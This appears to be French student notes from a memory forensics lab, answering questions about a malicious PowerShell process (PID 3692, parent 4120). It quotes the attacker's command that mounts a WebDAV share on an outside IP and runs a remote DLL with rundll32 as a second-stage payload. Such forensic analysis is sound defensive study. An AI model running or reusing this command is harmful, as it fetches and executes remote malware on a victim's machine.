

![[TP_RAM 2.pdf]]

![[Pasted image 20251008115722.png]]

![[Pasted image 20251008120230.png]]

![[Pasted image 20251008120259.png]]


![[Pasted image 20251008120641.png]]

![[Pasted image 20251008120657.png]]

![[Pasted image 20251008120716.png]]

2. Le **PID parent (PPID)** du processus malveillant (`powershell.exe`, PID **3692**) est **4120** — on le lit directement dans la sortie de `windows.pslist` :
```
3692    4120    powershell.exe   ...
```

3. Le fichier utilisé pour lancer la charge utile de 2ᵉ étape est **`3435.dll`** — appelé via :

`rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`

PowerShell monte un partage WebDAV (`\\45.9.74.32@8888\davwwwroot\`) puis exécute la DLL distante `3435.dll` avec `rundll32`.

4. Le répertoire partagé est **`davwwwroot`** — on le voit dans la ligne PowerShell :

`net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry`

